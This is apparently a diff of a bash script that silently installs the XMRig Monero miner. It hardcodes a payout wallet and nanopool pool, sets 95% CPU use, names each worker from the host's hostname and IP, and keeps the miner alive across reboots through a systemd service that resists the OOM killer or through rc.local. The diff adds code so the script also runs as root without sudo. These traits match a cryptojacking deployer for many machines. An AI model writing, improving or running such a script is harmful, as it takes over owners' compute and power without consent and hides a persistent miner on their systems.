@@ -5,6 +5,13 @@ WALLET="428AUvZzo4gPQENPyuTUGSjHCTSRB7YrjgZ7uAJNjC5GT2G6wc32ewC4n5yrMv3q2Rj8FwxP
 POOL="xmr-eu1.nanopool.org:10343"
 CPU_USAGE=95
 
+# Detect if we are running as root
+if [ "$(id -u)" -ne 0 ]; then
+  SUDO="sudo"
+else
+  SUDO=""
+fi
+
 # Generate unique worker name from hostname and padded IP
 HOSTNAME=$(hostname)
 IP=$(hostname -I | awk '{print $1}')
@@ -32,21 +39,35 @@ fi
 echo "[*] Installing dependencies..."
 case $PKG_MGR in
   "apt")
-    sudo apt update && sudo apt install -y libhwloc-dev libssl-dev wget tar
+    $SUDO apt update && $SUDO apt install -y libhwloc-dev libssl-dev wget tar
     ;;
   "dnf"|"yum")
-    sudo $PKG_MGR install -y hwloc openssl wget tar
+    $SUDO $PKG_MGR install -y hwloc openssl wget tar
     ;;
   "pacman")
-    sudo pacman -Sy --noconfirm hwloc openssl wget tar
+    $SUDO pacman -Sy --noconfirm hwloc openssl wget tar
     ;;
   "zypper")
-    sudo zypper install -y hwloc openssl wget tar
+    $SUDO zypper install -y hwloc openssl wget tar
     ;;
   *)
     echo "[!] Could not detect package manager. Please ensure 'wget', 'tar', 'libssl', and 'libhwloc' are installed."
     ;;
 esac
+
+# Check if sudo is available and install if necessary
+if ! command -v sudo &>/dev/null && [ "$SUDO" != "" ]; then
+  echo "[*] Installing sudo..."
+  if [ "$PKG_MGR" == "apt" ]; then
+    apt install -y sudo
+  elif [ "$PKG_MGR" == "dnf" ] || [ "$PKG_MGR" == "yum" ]; then
+    $PKG_MGR install -y sudo
+  elif [ "$PKG_MGR" == "pacman" ]; then
+    pacman -Sy --noconfirm sudo
+  elif [ "$PKG_MGR" == "zypper" ]; then
+    zypper install -y sudo
+  fi
+fi
 
 # Download and install XMRig
 echo "[*] Downloading XMRig precompiled binary..."
@@ -54,12 +75,12 @@ cd /tmp
 wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O xmrig.tar.gz
 tar -xzf xmrig.tar.gz
 XMRIG_DIR=$(tar -tf xmrig.tar.gz | head -1 | cut -f1 -d"/")
-sudo mv "$XMRIG_DIR/xmrig" /usr/local/bin/
+$SUDO mv "$XMRIG_DIR/xmrig" /usr/local/bin/
 rm -rf xmrig.tar.gz "$XMRIG_DIR"
 
 # Generate config
 echo "[*] Creating config..."
-sudo tee /etc/xmrig.conf >/dev/null <<EOF
+$SUDO tee /etc/xmrig.conf >/dev/null <<EOF
 {
   "autosave": true,
   "cpu": {
@@ -90,7 +111,7 @@ EOF
 echo "[*] Detecting init system..."
 if pidof systemd &>/dev/null; then
   echo "[*] systemd detected - creating systemd service"
-  sudo tee /etc/systemd/system/xmrig.service >/dev/null <<EOF
+  $SUDO tee /etc/systemd/system/xmrig.service >/dev/null <<EOF
 [Unit]
 Description=XMRig NanoPool Miner
 After=network.target
@@ -105,20 +126,20 @@ OOMScoreAdjust=-1000
 [Install]
 WantedBy=multi-user.target
 EOF
-  sudo systemctl daemon-reload
-  sudo systemctl enable xmrig
-  sudo systemctl start xmrig
+  $SUDO systemctl daemon-reload
+  $SUDO systemctl enable xmrig
+  $SUDO systemctl start xmrig
 
 elif [ -f /etc/init.d/cron ] || [ -d /etc/init.d ]; then
   echo "[*] init.d detected - using /etc/rc.local fallback"
   if [ -f /etc/rc.local ]; then
-    sudo sed -i '/xmrig/d' /etc/rc.local
+    $SUDO sed -i '/xmrig/d' /etc/rc.local
   else
-    echo "#!/bin/bash" | sudo tee /etc/rc.local >/dev/null
+    echo "#!/bin/bash" | $SUDO tee /etc/rc.local >/dev/null
   fi
-  echo "/usr/local/bin/xmrig -c /etc/xmrig.conf &" | sudo tee -a /etc/rc.local >/dev/null
-  sudo chmod +x /etc/rc.local
-  sudo /etc/rc.local
+  echo "/usr/local/bin/xmrig -c /etc/xmrig.conf &" | $SUDO tee -a /etc/rc.local >/dev/null
+  $SUDO chmod +x /etc/rc.local
+  $SUDO /etc/rc.local
 
 else
   echo "[!] No service manager detected, running miner in background using nohup..."
